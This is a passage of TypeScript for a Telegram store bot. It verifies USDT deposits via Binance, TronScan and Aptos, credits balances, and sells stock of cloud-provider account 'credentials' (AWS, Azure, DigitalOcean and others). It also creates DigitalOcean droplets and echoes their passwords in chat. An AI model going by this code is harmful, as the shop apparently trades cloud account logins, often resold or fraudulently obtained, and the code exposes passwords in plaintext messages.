                        `<tg-emoji emoji-id="6276090299232031662">✅</tg-emoji> <b>TRC20 Payment Verified successfully!</b>\n\n` +
                        `<tg-emoji emoji-id="5388622778817589921">💰</tg-emoji> Credited: <b>$${actualAmount.toFixed(2)}</b> has been added to your balance.\n` +
                        `<tg-emoji emoji-id="6276090299232031662">🆔</tg-emoji> Account ID: <code>${tgUser.telegramId}</code>\n\n` +
                        `Thank you for your purchase! <tg-emoji emoji-id="5231102735817918643">🤍</tg-emoji>`,
                        { parse_mode: 'HTML' }
                      );

                      const userDisplayName = tgUser.firstName || tgUser.username || "User";
                      io.emit('admin_notification', {
                        type: 'deposit',
                        title: 'New TRC20 Deposit',
                        message: `${userDisplayName} deposited $${actualAmount.toFixed(2)} via TRC20`,
                        data: {
                          paymentId: payment.id,
                          userId: tgUser.telegramId,
                          amount: actualAmount,
                          txId: d.txId
                        }
                      });

                      sendAdminPushNotification(
                        'New TRC20 Deposit',
                        `${userDisplayName} deposited $${actualAmount.toFixed(2)} (TXID: ${d.txId.substring(0, 10)}...)`
                      ).catch(console.error);

                      break;
                    }
                  }
                }
              } else {
                const url = `https://apilist.tronscanapi.com/api/token_trc20/transfers?limit=20&start=0&direction=2&address=${walletAddress.trim()}`;
                const res = await axios.get(url);
                const dataTRC = res.data;

                if (dataTRC && dataTRC.token_transfers && dataTRC.token_transfers.length > 0) {
                  const expectedAmount = payment.amount / 100;
                  const paymentCreatedAtMs = payment.createdAt ? new Date(payment.createdAt).getTime() : Date.now();

                  for (const transfer of dataTRC.token_transfers) {
                    const txId = (transfer.transaction_id || '').toLowerCase();

                    const toAddr = (transfer.to_address || '').trim().toLowerCase();
                    const contractAddr = (transfer.contract_address || '').trim();
                    const blockTs = Number(transfer.block_ts || 0);

                    if (toAddr === walletAddress.trim().toLowerCase() &&
                        contractAddr === 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' &&
                        (transfer.confirmed === true || transfer.contractRet === 'SUCCESS' || transfer.finalResult === 'SUCCESS')) {

                      if (blockTs >= paymentCreatedAtMs - 60000) {
                        const decimals = transfer.tokenInfo?.tokenDecimal || 6;
                        const actualAmount = parseFloat(transfer.quant || '0') / Math.pow(10, decimals);

                        if (Math.abs(actualAmount - expectedAmount) < 0.001) {
                          // Atomic locking transaction
                          const txResult = await db.transaction(async (tx) => {
                            const [settingRow] = await tx.select().from(settings).where(eq(settings.key, 'USED_TXIDS_JSON')).for('update');
                            let currentUsed: string[] = [];
                            if (settingRow?.value) {
                              try { currentUsed = JSON.parse(settingRow.value); } catch(e) {}
                            }
                            if (currentUsed.includes(txId)) {
                              return { success: false, error: "duplicate" };
                            }

                            const [u] = await tx.select().from(telegramUsers).where(eq(telegramUsers.id, tgUser.id)).for('update');
                            if (!u) return { success: false, error: "user_not_found" };

                            currentUsed.push(txId);
                            if (settingRow) {
                              await tx.update(settings).set({ value: JSON.stringify(currentUsed), updatedAt: new Date() }).where(eq(settings.key, 'USED_TXIDS_JSON'));
                            } else {
                              await tx.insert(settings).values({ key: 'USED_TXIDS_JSON', value: JSON.stringify(currentUsed) });
                            }

                            const creditAmountCents = Math.round(actualAmount * 100);
                            await tx.update(telegramUsers).set({
                              balance: u.balance + creditAmountCents,
                              lastAction: null,
                              lastMessageId: null
                            }).where(eq(telegramUsers.id, u.id));

                            await tx.update(payments).set({
                              status: 'completed',
                              externalId: transfer.transaction_id,
                              amount: creditAmountCents,
                              updatedAt: new Date()
                            }).where(eq(payments.id, payment.id));

                            return { success: true, creditAmountCents };
                          });

                          if (txResult.success) {
                            matched = true;
                            if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });

                            await targetBot.sendMessage(chatId, 
                              `<tg-emoji emoji-id="6276090299232031662">✅</tg-emoji> <b>TRC20 Payment Verified successfully!</b>\n\n` +
                              `<tg-emoji emoji-id="5388622778817589921">💰</tg-emoji> Credited: <b>$${actualAmount.toFixed(2)}</b> has been added to your balance.\n` +
                              `<tg-emoji emoji-id="6276090299232031662">🆔</tg-emoji> Account ID: <code>${tgUser.telegramId}</code>\n\n` +
                              `Thank you for your purchase! <tg-emoji emoji-id="5231102735817918643">🤍</tg-emoji>`,
                              { parse_mode: 'HTML' }
                            );

                            const userDisplayName = tgUser.firstName || tgUser.username || "User";
                            io.emit('admin_notification', {
                              type: 'deposit',
                              title: 'New TRC20 Deposit',
                              message: `${userDisplayName} deposited $${actualAmount.toFixed(2)} via TRC20`,
                              data: {
                                paymentId: payment.id,
                                userId: tgUser.telegramId,
                                amount: actualAmount,
                                txId: transfer.transaction_id
                              }
                            });

                            sendAdminPushNotification(
                              'New TRC20 Deposit',
                              `${userDisplayName} deposited $${actualAmount.toFixed(2)} (TXID: ${transfer.transaction_id.substring(0, 10)}...)`
                            ).catch(console.error);

                            break;
                          }
                        }
                      }
                    }
                  }
                }
              }

              if (!matched) {
                await storage.updatePayment(payment.id, { status: 'pending' });
                if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });

                const failMsg = `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Your payment is still pending please pay.</b>\n\nIf you have already paid, please copy and send your <b>Transaction Hash / ID (TXID)</b> directly in the chat for automatic verification.`;
                const sentMsg = await targetBot.sendMessage(chatId, failMsg, { parse_mode: 'HTML' });
                if (sentMsg) {
                  await storage.updateTelegramUser(tgUser.id, { lastErrorMessageId: sentMsg.message_id, lastAction: `awaiting_trc20_txid_${payment.id}_0` });
                  setTimeout(() => {
                    targetBot.deleteMessage(chatId, sentMsg.message_id).catch(() => { });
                  }, 15000);
                }
              }
            } catch (err: any) {
              await storage.updatePayment(payment.id, { status: 'pending' }).catch(() => {});
              console.error("Error during TRC20 check payment:", err);
              if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });
              await targetBot.sendMessage(chatId, `❌ Error verifying TRC20 payment: ${err.message || err}`);
            }
          } else if (payment.paymentMethod === 'aptos') {
            const walletAddress = (await storage.getSetting('APTOS_WALLET_ADDRESS'))?.value;
            if (!walletAddress) {
              await storage.updatePayment(payment.id, { status: 'pending' });
              if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });
              await targetBot.sendMessage(chatId, "⚠️ Aptos wallet address is not configured. Please contact support.");
              return;
            }

            try {
              const verificationMode = (await storage.getSetting('APTOS_VERIFICATION_MODE'))?.value || 'binance';
              let matched = false;

              if (verificationMode === 'binance') {
                const apiKey = (await storage.getSetting('BINANCE_API_KEY'))?.value;
                const secretKey = (await storage.getSetting('BINANCE_SECRET_KEY'))?.value;

                if (!apiKey || !secretKey) {
                  await storage.updatePayment(payment.id, { status: 'pending' });
                  if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });
                  await targetBot.sendMessage(chatId, "⚠️ Automatic verification is not configured for Binance. Please contact support.");
                  return;
                }

                const timestamp = Date.now();
                const queryStr = `coin=USDT&timestamp=${timestamp}`;
                const signature = crypto
                  .createHmac('sha256', secretKey)
                  .update(queryStr)
                  .digest('hex');

                const res = await axios.get(`https://api.binance.com/sapi/v1/capital/deposit/hisrec?${queryStr}&signature=${signature}`, {
                  headers: {
                    'X-MBX-APIKEY': apiKey,
                    'Content-Type': 'application/json'
                  }
                });

                const deposits = res.data;
                if (deposits && Array.isArray(deposits)) {
                  const expectedAmount = payment.amount / 100;
                  const paymentCreatedAtMs = payment.createdAt ? new Date(payment.createdAt).getTime() : Date.now();

                  for (const d of deposits) {
                    const txId = (d.txId || '').toLowerCase();
                    if (d.status !== 1) continue;
                    if ((d.coin || '').toUpperCase() !== 'USDT') continue;

                    const net = (d.network || '').toUpperCase();
                    if (net !== 'APT' && net !== 'APTOS') continue;

                    const depAddr = (d.address || '').trim();
                    if (normalizeAptosAddress(depAddr) !== normalizeAptosAddress(walletAddress)) continue;

                    const insertTime = Number(d.insertTime || 0);
                    if (insertTime < paymentCreatedAtMs - 120000) continue;

                    const actualAmount = parseFloat(d.amount);
                    if (isNaN(actualAmount) || Math.abs(actualAmount - expectedAmount) >= 0.001) continue;

                    // Atomic locking transaction
                    const txResult = await db.transaction(async (tx) => {
                      const [settingRow] = await tx.select().from(settings).where(eq(settings.key, 'USED_TXIDS_JSON')).for('update');
                      let currentUsed: string[] = [];
                      if (settingRow?.value) {
                        try { currentUsed = JSON.parse(settingRow.value); } catch(e) {}
                      }
                      if (currentUsed.includes(txId)) {
                        return { success: false, error: "duplicate" };
                      }

                      const [u] = await tx.select().from(telegramUsers).where(eq(telegramUsers.id, tgUser.id)).for('update');
                      if (!u) return { success: false, error: "user_not_found" };

                      currentUsed.push(txId);
                      if (settingRow) {
                        await tx.update(settings).set({ value: JSON.stringify(currentUsed), updatedAt: new Date() }).where(eq(settings.key, 'USED_TXIDS_JSON'));
                      } else {
                        await tx.insert(settings).values({ key: 'USED_TXIDS_JSON', value: JSON.stringify(currentUsed) });
                      }

                      const creditAmountCents = Math.round(actualAmount * 100);
                      await tx.update(telegramUsers).set({
                        balance: u.balance + creditAmountCents,
                        lastAction: null,
                        lastMessageId: null
                      }).where(eq(telegramUsers.id, u.id));

                      await tx.update(payments).set({
                        status: 'completed',
                        externalId: d.txId,
                        amount: creditAmountCents,
                        updatedAt: new Date()
                      }).where(eq(payments.id, payment.id));

                      return { success: true, creditAmountCents };
                    });

                    if (txResult.success) {
                      matched = true;
                      if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });

                      await targetBot.sendMessage(chatId, 
                        `<tg-emoji emoji-id="6276090299232031662">✅</tg-emoji> <b>Aptos Payment Verified successfully!</b>\n\n` +
                        `<tg-emoji emoji-id="5388622778817589921">💰</tg-emoji> Credited: <b>$${actualAmount.toFixed(2)}</b> has been added to your balance.\n` +
                        `<tg-emoji emoji-id="6276090299232031662">🆔</tg-emoji> Account ID: <code>${tgUser.telegramId}</code>\n\n` +
                        `Thank you for your purchase! <tg-emoji emoji-id="5231102735817918643">🤍</tg-emoji>`,
                        { parse_mode: 'HTML' }
                      );

                      const userDisplayName = tgUser.firstName || tgUser.username || "User";
                      io.emit('admin_notification', {
                        type: 'deposit',
                        title: 'New Aptos Deposit',
                        message: `${userDisplayName} deposited $${actualAmount.toFixed(2)} via Aptos`,
                        data: {
                          paymentId: payment.id,
                          userId: tgUser.telegramId,
                          amount: actualAmount,
                          txId: d.txId
                        }
                      });

                      sendAdminPushNotification(
                        'New Aptos Deposit',
                        `${userDisplayName} deposited $${actualAmount.toFixed(2)} (TXID: ${d.txId.substring(0, 10)}...)`
                      ).catch(console.error);

                      break;
                    }
                  }
                }
              } else {
                const url = `https://fullnode.mainnet.aptoslabs.com/v1/accounts/${walletAddress.trim()}/transactions?limit=15`;
                const res = await axios.get(url);
                const transactions = res.data;

                if (transactions && Array.isArray(transactions) && transactions.length > 0) {
                  const expectedAmount = payment.amount / 100;
                  const paymentCreatedAtMs = payment.createdAt ? new Date(payment.createdAt).getTime() : Date.now();
                  const normWallet = normalizeAptosAddress(walletAddress);

                  for (const tx of transactions) {
                    const txId = (tx.hash || '').toLowerCase();
                    if (tx.success !== true) continue;

                    const txTimestampMs = Math.floor(parseInt(tx.timestamp || '0') / 1000);
                    if (txTimestampMs < paymentCreatedAtMs - 60000) continue;

                    let actualAmount = 0;
                    let found = false;

                    if (tx.payload) {
                      const payload = tx.payload;
                      const fn = payload.function || '';

                      if (fn === '0x1::primary_fungible_store::transfer') {
                        const args = payload.arguments || payload.function_arguments || [];
                        const recipient = args[1] || '';
                        const amountStr = args[2] || '0';

                        if (normalizeAptosAddress(recipient) === normWallet) {
                          actualAmount = parseFloat(amountStr) / 1000000;
                          found = true;
                        }
                      } else if (fn === '0x1::coin::transfer' || fn === '0x1::aptos_account::transfer_coins') {
                        const args = payload.arguments || payload.function_arguments || [];
                        const recipient = args[0] || '';
                        const amountStr = args[1] || '0';

                        if (normalizeAptosAddress(recipient) === normWallet) {
                          actualAmount = parseFloat(amountStr) / 1000000;
                          found = true;
                        }
                      }
                    }

                    if (!found && tx.events) {
                      for (const event of tx.events) {
                        const evType = event.type || '';
                        if (evType.includes('::coin::DepositEvent') || evType.includes('::fungible_asset::DepositEvent') || evType.includes('Deposit')) {
                          const guidAddress = event.guid?.account_address || '';
                          if (normalizeAptosAddress(guidAddress) === normWallet) {
                            const amountStr = event.data?.amount || '0';
                            actualAmount = parseFloat(amountStr) / 1000000;
                            found = true;
                            break;
                          }
                        }
                      }
                    }

                    if (found && actualAmount > 0) {
                      if (Math.abs(actualAmount - expectedAmount) < 0.001) {
                        // Atomic locking transaction
                        const txResult = await db.transaction(async (tx) => {
                          const [settingRow] = await tx.select().from(settings).where(eq(settings.key, 'USED_TXIDS_JSON')).for('update');
                          let currentUsed: string[] = [];
                          if (settingRow?.value) {
                            try { currentUsed = JSON.parse(settingRow.value); } catch(e) {}
                          }
                          if (currentUsed.includes(txId)) {
                            return { success: false, error: "duplicate" };
                          }

                          const [u] = await tx.select().from(telegramUsers).where(eq(telegramUsers.id, tgUser.id)).for('update');
                          if (!u) return { success: false, error: "user_not_found" };

                          currentUsed.push(txId);
                          if (settingRow) {
                            await tx.update(settings).set({ value: JSON.stringify(currentUsed), updatedAt: new Date() }).where(eq(settings.key, 'USED_TXIDS_JSON'));
                          } else {
                            await tx.insert(settings).values({ key: 'USED_TXIDS_JSON', value: JSON.stringify(currentUsed) });
                          }

                          const creditAmountCents = Math.round(actualAmount * 100);
                          await tx.update(telegramUsers).set({
                            balance: u.balance + creditAmountCents,
                            lastAction: null,
                            lastMessageId: null
                          }).where(eq(telegramUsers.id, u.id));

                          await tx.update(payments).set({
                            status: 'completed',
                            externalId: tx.hash,
                            amount: creditAmountCents,
                            updatedAt: new Date()
                          }).where(eq(payments.id, payment.id));

                          return { success: true, creditAmountCents };
                        });

                        if (txResult.success) {
                          matched = true;
                          if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });

                          await targetBot.sendMessage(chatId, 
                            `<tg-emoji emoji-id="6276090299232031662">✅</tg-emoji> <b>Aptos Payment Verified successfully!</b>\n\n` +
                            `<tg-emoji emoji-id="5388622778817589921">💰</tg-emoji> Credited: <b>$${actualAmount.toFixed(2)}</b> has been added to your balance.\n` +
                            `<tg-emoji emoji-id="6276090299232031662">🆔</tg-emoji> Account ID: <code>${tgUser.telegramId}</code>\n\n` +
                            `Thank you for your purchase! <tg-emoji emoji-id="5231102735817918643">🤍</tg-emoji>`,
                            { parse_mode: 'HTML' }
                          );

                          const userDisplayName = tgUser.firstName || tgUser.username || "User";
                          io.emit('admin_notification', {
                            type: 'deposit',
                            title: 'New Aptos Deposit',
                            message: `${userDisplayName} deposited $${actualAmount.toFixed(2)} via Aptos`,
                            data: {
                              paymentId: payment.id,
                              userId: tgUser.telegramId,
                              amount: actualAmount,
                              txId: tx.hash
                            }
                          });

                          sendAdminPushNotification(
                            'New Aptos Deposit',
                            `${userDisplayName} deposited $${actualAmount.toFixed(2)} (TXID: ${tx.hash.substring(0, 10)}...)`
                          ).catch(console.error);

                          break;
                        }
                      }
                    }
                  }
                }
              }

              if (!matched) {
                await storage.updatePayment(payment.id, { status: 'pending' });
                if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });

                const failMsg = `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Your payment is still pending please pay.</b>\n\nIf you have already paid, please copy and send your <b>Transaction Hash / ID (TXID)</b> directly in the chat for automatic verification.`;
                const sentMsg = await targetBot.sendMessage(chatId, failMsg, { parse_mode: 'HTML' });
                if (sentMsg) {
                  await storage.updateTelegramUser(tgUser.id, { lastErrorMessageId: sentMsg.message_id, lastAction: `awaiting_aptos_txid_${payment.id}_0` });
                  setTimeout(() => {
                    targetBot.deleteMessage(chatId, sentMsg.message_id).catch(() => { });
                  }, 15000);
                }
              }
            } catch (err: any) {
              await storage.updatePayment(payment.id, { status: 'pending' }).catch(() => {});
              console.error("Error during Aptos check payment:", err);
              if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });
              await targetBot.sendMessage(chatId, `❌ Error verifying Aptos payment: ${err.message || err}`);
            }
          }
        } catch (err) {
          await storage.updatePayment(payment.id, { status: 'pending' }).catch(() => {});
          if (checkingMsg) await targetBot.deleteMessage(chatId, (checkingMsg as any).message_id).catch(() => { });
          await targetBot.sendMessage(chatId, "❌ Error connecting to exchange API. Please contact support.");
        }
        return;
      }
    } catch (err) {
      console.error("Global Callback Listener Error:", err);
    }
  });

  targetBot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const parameter = match ? match[1] : null;

      // Fetch branding settings
      const storeNameSetting = await storage.getSetting("STORE_NAME");
      const storeName = storeNameSetting?.value || "Imesh cloud store";

      const supportBtnTextSetting = await storage.getSetting("SUPPORT_BTN_TEXT");
      const supportBtnText = supportBtnTextSetting?.value || "Write to support";

      const baseUrl = process.env.BASE_URL || (process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'https://your-domain.com');
      const shopUrl = `${baseUrl}/shop`;

      const opts: TelegramBot.SendMessageOptions = {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            [{ text: '🛍️ Buy' }, { text: '👤 Profile' }, { text: '📋 Availability' }],
            [{ text: supportBtnText }, { text: '❓ FAQ' }]
          ],
          resize_keyboard: true
        }
      };

      // If no parameter, show the standard welcome message
      if (!parameter) {
        targetBot.sendMessage(chatId, `<b>Welcome to ${storeName} !</b> <tg-emoji emoji-id="5456343263340405032">🛍</tg-emoji>\n\n<b>Select an option below:</b> <tg-emoji emoji-id="5231102735817918643">🔖</tg-emoji>`, opts);
      } else if (parameter.startsWith('offer_')) {
        const offerId = parseInt(parameter.substring(6));
        const offer = await storage.getSpecialOffer(offerId);
        if (offer) {
          const product = await storage.getProduct(offer.productId);
          const tgUser = await storage.getTelegramUser(msg.from?.id.toString() || "");
          if (tgUser && product) {
            // 1. Balance Check - If insufficient, show unsuccessful message
            if (tgUser.balance < offer.price) {
              const errorMsg = `❌ <b>Purchase Unsuccessful</b>\n\n` +
                `━━━━━━━━━━━━━━━\n` +
                `🎁 Offer: <b>${offer.name}</b>\n` +
                `💵 Price: <b>$${(offer.price / 100).toFixed(2)}</b>\n` +
                `💰 Your Balance: <b>$${(tgUser.balance / 100).toFixed(2)}</b>\n\n` +
                `Please top-up your balance and try again.`;

              return targetBot.sendMessage(chatId, errorMsg, {
                parse_mode: 'HTML',
                reply_markup: {
                  inline_keyboard: [[{ text: 'Add Funds', callback_data: 'add_funds', icon_custom_emoji_id: '5201692367437974073' }]]
                }
              });
            }

            // 2. Sufficient Balance - Show Confirm Button instead of asking quantity
            const stock = await storage.getCredentialsByProduct(product.id);
            const availableStock = stock.filter(c => c.status === 'available').length;

            if (availableStock < (offer.bundleQuantity || 1)) {
              const claimedMsg = `<tg-emoji emoji-id="5215209935188534658">⚠️</tg-emoji> <b>Claim Unsuccessful</b>\n\n` +
                `This offer has been already claimed by another person! <tg-emoji emoji-id="5231102735817918643">🤍</tg-emoji>`;
              return targetBot.sendMessage(chatId, claimedMsg, { parse_mode: 'HTML' });
            }

            const confirmMsg = `🎁 <b>Confirm Your Purchase</b>\n\n` +
              `You are about to claim: <b>${offer.name}</b>\n` +
              `Total Price: <b>$${(offer.price / 100).toFixed(2)}</b>\n\n` +
              `Would you like to proceed with the purchase?`;

            const keyboard = {
              inline_keyboard: [
                [{ text: '✅ Confirm Purchase', callback_data: `confirm_offer_${offerId}` }],
                [{ text: '❌ Cancel', callback_data: 'cancel_purchase' }]
              ]
            };

            return targetBot.sendMessage(chatId, confirmMsg, {
              parse_mode: 'HTML',
              reply_markup: keyboard
            });
          }
        }
        
        // Fetch store name for fallback welcome
        const storeNameSetting = await storage.getSetting("STORE_NAME");
        const storeName = storeNameSetting?.value || "Imesh cloud store";
        
        targetBot.sendMessage(chatId, `<b>Welcome to ${storeName} !</b> <tg-emoji emoji-id="5456343263340405032">🛍</tg-emoji>\n\n<b>Select an option below:</b> <tg-emoji emoji-id="5231102735817918643">🔖</tg-emoji>`, opts);
      }

      if (msg.from) {
        const tgUser = await storage.getTelegramUser(msg.from.id.toString());
        if (!tgUser) {
          await storage.createTelegramUser({
            telegramId: msg.from.id.toString(),
            username: msg.from.username,
            firstName: msg.from.first_name,
            lastName: msg.from.last_name,
            balance: 0,
            lastAction: null
          });
        } else {
          // Reset state on /start if user already exists
          await storage.updateTelegramUser(tgUser.id, { lastAction: null });
        }
      }
    });

    // Global message deduplication to prevent double messages
    const processedMessages = new Set<string>();
    const isDuplicateMessage = (msgId: number, chatId: number) => {
      const key = `${chatId}:${msgId}`;
      if (processedMessages.has(key)) return true;
      processedMessages.add(key);
      setTimeout(() => processedMessages.delete(key), 30000); // 30s cache
      return false;
    };

    targetBot.on('message', async (msg) => {
      const chatId = msg.chat.id;
      const userId = msg.from?.id.toString();
      if (!userId) return;
      const tgUser = await storage.getTelegramUser(userId);

      // Bypass processing if message is a command
      if (msg.text?.startsWith('/')) return;

      // Option 2: Start fast countdown on any message interaction
      let activeOffersMsg = [];
      try {
        activeOffersMsg = await storage.getActiveSpecialOffers();
      } catch (err) { }
      
      if (tgUser?.lastOfferBroadcastId && activeOffersMsg.length > 0) {
        startFastTimer(userId, activeOffersMsg[0].id, tgUser.lastOfferBroadcastId);
      }

      if (tgUser?.lastAction?.startsWith('awaiting_screenshot_') && msg.photo) {
        const parts = tgUser.lastAction.split('_');
        const method = parts[2];
        const amount = parts[3];
        const botInstance = targetBot;
        if (botInstance) {
          await botInstance.sendMessage(chatId, `✅ Screenshot received! Your $${amount} top-up via ${method} is being reviewed.`);
          await storage.updateTelegramUser(parseInt(userId), { lastAction: null });
          const adminSetting = await storage.getSetting('ADMIN_CHAT_ID');
          if (adminSetting?.value) {
            const photo = msg.photo[msg.photo.length - 1].file_id;
            await botInstance.sendPhoto(adminSetting.value, photo, {
              caption: `💰 *New Deposit Proof*\nUser: \`${userId}\`\nMethod: ${method}\nAmount: $${amount}`,
              parse_mode: 'Markdown',
              reply_markup: {
                inline_keyboard: [[
                  { text: '✅ Approve', callback_data: `approve_dep_${userId}_${amount}` },
                  { text: '❌ Reject', callback_data: `reject_dep_${userId}` }
                ]]
              }
            });

            // Emit real-time notification to Admin Dashboard
            io.emit('admin_notification', {
              type: 'deposit',
              title: 'New Deposit Proof',
              message: `User ${userId} sent a proof for $${amount} via ${method}`,
              data: { userId, amount, method }
            });

            // Emit Native Push Notification
            sendAdminPushNotification(
              'New Deposit Proof',
              `User ${userId} sent a proof for $${amount} via ${method}`
            ).catch(console.error);
          }
        }
        return;
      }

      if (isDuplicateMessage(msg.message_id, msg.chat.id)) return;

      if (msg.chat.type === 'group' || msg.chat.type === 'supergroup' || msg.chat.type === 'channel') {
        try {
          const channels = await storage.getBroadcastChannels();
          if (!channels.some(c => c.channelId === msg.chat.id.toString())) {
            await storage.createBroadcastChannel({
              channelId: msg.chat.id.toString(),
              name: msg.chat.title || 'Auto-detected Group'
            });
          }
        } catch (err) { }
      }
    });

    targetBot.on('message', async (msg) => {
      const chatId = msg.chat.id;
      const text = msg.text;
      const userId = msg.from?.id.toString();
      if (!userId) return;

      const isBlocked = await processAntiSpamCheck(userId, chatId);
      if (isBlocked) return;

      const tgUser = await storage.getTelegramUser(userId);

      // Standardize text comparison by trimming and ignoring case if necessary
      const normalizedText = text?.trim();
      
      const supportBtnTextSetting = await storage.getSetting("SUPPORT_BTN_TEXT");
      const supportBtnText = supportBtnTextSetting?.value || "Write to support";

      if (normalizedText === '🛍️ Buy' || normalizedText === '📋 Availability' || normalizedText === 'Buy') {
        console.log(`Buy/Availability requested for user: ${userId}`);
        const products = await storage.getProducts();

        const availableProducts = [];
        for (const p of products) {
          if (p.status !== 'available') continue;
          const stock = (await storage.getCredentialsByProduct(p.id)).filter(c => c.status === 'available');
          if (stock.length > 0) {
            availableProducts.push({ ...p, stockCount: stock.length });
          }
        }

        if (availableProducts.length === 0) {
          const botInstance = targetBot;
          if (botInstance) await botInstance.sendMessage(chatId, 'Sorry, no accounts available right now.');
          return;
        }

        if (normalizedText === '📋 Availability') {
          const groupedProducts: Record<string, any[]> = {};
          for (const p of availableProducts) {
            if (!groupedProducts[p.type]) groupedProducts[p.type] = [];
            groupedProducts[p.type].push(p);
          }

          let response = "<tg-emoji emoji-id=\"5215209935188534658\">📋</tg-emoji> <b>Product Availability</b>\n\n";
          for (const [category, items] of Object.entries(groupedProducts)) {
            let catIcon = '';
            const catLower = category.toLowerCase();
            if (catLower.includes('aws')) catIcon = '<tg-emoji emoji-id="5785025630055700143">☁️</tg-emoji> ';
            else if (catLower.includes('digital ocean') || catLower.includes('digitalocean')) catIcon = '<tg-emoji emoji-id="6235413342576450502">💧</tg-emoji> ';
            else if (catLower.includes('azure')) catIcon = '<tg-emoji emoji-id="6235420094265037090">☁️</tg-emoji> ';
            else if (catLower.includes('kamatera')) catIcon = '<tg-emoji emoji-id="6235239937566838722">☁️</tg-emoji> ';

            response += `➖➖➖ ${catIcon}<b>${escapeHTML(category)}</b> <tg-emoji emoji-id="5456343263340405032">🛍</tg-emoji> ➖➖➖\n`;
            for (const item of items) {
              let formattedName = escapeHTML(item.name).replace(/🇱🇰/g, '<tg-emoji emoji-id="5224277294050192388">🇱🇰</tg-emoji>');

              if (item.customEmojiId) {
                formattedName = `<tg-emoji emoji-id="${item.customEmojiId}">⭐</tg-emoji> ${formattedName}`;
              } else if (!formattedName.includes('5785025630055700143')) {
                formattedName = formattedName.replace(/\bAWS\b/gi, '<tg-emoji emoji-id="5785025630055700143">☁️</tg-emoji> AWS');
              }

              response += `${formattedName} | $${(item.price / 100).toFixed(2)} | In stock ${item.stockCount} pcs\n`;
            }
            response += "\n";
          }
          const botInstance = targetBot;
          if (botInstance) await botInstance.sendMessage(chatId, response, { parse_mode: 'HTML' });
          return;
        }

        const categories = Array.from(new Set(availableProducts.map(p => p.type as string)));
        const keyboard = categories.map(cat => {
          let btnText = cat;
          let iconEmojiId: string | undefined = undefined;
          const catLower = cat.toLowerCase();

          const prodWithEmoji = availableProducts.find(p => p.type === cat && p.customEmojiId);
          if (prodWithEmoji?.customEmojiId) {
            iconEmojiId = prodWithEmoji.customEmojiId;
          } else if (catLower.includes('digital ocean') || catLower.includes('digitalocean')) {
            btnText = 'Digital Ocean';
            iconEmojiId = '5785345544989710932';
          } else if (catLower.includes('aws')) {
            btnText = 'AWS';
            iconEmojiId = '5785025630055700143';
          } else if (catLower.includes('linode')) {
            btnText = 'Linode';
            iconEmojiId = '5787285044846399857';
          } else if (catLower.includes('azure')) {
            btnText = 'Azure';
            iconEmojiId = '5785185643357279341';
          } else if (catLower.includes('gcp') || catLower.includes('google cloud')) {
            btnText = 'GCP';
            iconEmojiId = '5785061312643994750';
          } else if (catLower.includes('kamatera')) {
            btnText = 'Kamatera';
            iconEmojiId = '5785070770161980265';
          }

          const btnObj: any = { text: btnText, callback_data: `cat_${cat}` };
          if (iconEmojiId) {
            btnObj.icon_custom_emoji_id = iconEmojiId;
          }
          return [btnObj];
        });
        const botInstance = targetBot;
        if (botInstance) {
          await botInstance.sendMessage(chatId, `<tg-emoji emoji-id="6276134137963222688">🛍</tg-emoji> <b>Select the product you need</b> <tg-emoji emoji-id="5231102735817918643">🎁</tg-emoji>`, {
            reply_markup: {
              inline_keyboard: keyboard
            },
            parse_mode: 'HTML'
          });
        }
      } else if (tgUser?.lastAction?.includes('_auth_pass_await')) {
        const password = normalizedText || '';
        const flowData = tgUser.lastAction.split('_');
        const region = flowData[3];
        const image = flowData[7];
        const size = flowData[11];

        if (password.length < 8) {
          await targetBot.sendMessage(chatId, "❌ Password must be at least 8 characters long. Please try again:");
          return;
        }

        await storage.updateTelegramUserByChatId(userId, { lastAction: null });
        await targetBot.sendMessage(chatId, "🚀 Starting droplet creation... Please wait.");

        try {
          const response = await axios.post('https://api.digitalocean.com/v2/droplets', {
            name: `cloudshop-${userId}-${Math.floor(Date.now() / 1000)}`,
            region: region,
            size: size,
            image: image,
            password: password
          }, {
            headers: {
              'Authorization': `Bearer ${tgUser.doApiKey}`,
              'Content-Type': 'application/json'
            }
          });
          const droplet = response.data.droplet;
          await storage.updateTelegramUserByChatId(userId, { lastDropletId: droplet.id.toString() });

          await targetBot.sendMessage(chatId, `✅ Droplet creation started!\n\nName: \`${droplet.name}\`\nRegion: \`${region}\`\nOS: \`${image}\`\nSize: \`${size}\`\n\nI will notify you once the IP address is assigned.`);

          // Poll for IP address
          let attempts = 0;
          const pollInterval = setInterval(async () => {
            attempts++;
            if (attempts > 20) {
              clearInterval(pollInterval);
              return;
            }
            try {
              const checkRes = await axios.get(`https://api.digitalocean.com/v2/droplets/${droplet.id}`, {
                headers: { 'Authorization': `Bearer ${tgUser.doApiKey}` }
              });
              const updatedDroplet = checkRes.data.droplet;
              const ipv4 = updatedDroplet.networks.v4.find((n: any) => n.type === 'public')?.ip_address;
              if (ipv4) {
                clearInterval(pollInterval);
                await targetBot.sendMessage(chatId, `🌐 *Droplet Access Info*\n\nIP IPv4: \`${ipv4}\`\nPassword: \`${password}\`\n\nYou can now connect via SSH.`);
              }
            } catch (e) { }
          }, 15000);

        } catch (err: any) {
          await targetBot.sendMessage(chatId, `❌ Creation failed: ${err.response?.data?.message || err.message}`);
        }
      } else if (tgUser?.lastAction?.includes('_auth_ssh_await')) {
        const sshKey = normalizedText;
        const flowData = tgUser.lastAction.split('_');
        const region = flowData[3];
        const image = flowData[7];
        const size = flowData[11];

        await storage.updateTelegramUserByChatId(userId, { lastAction: null });
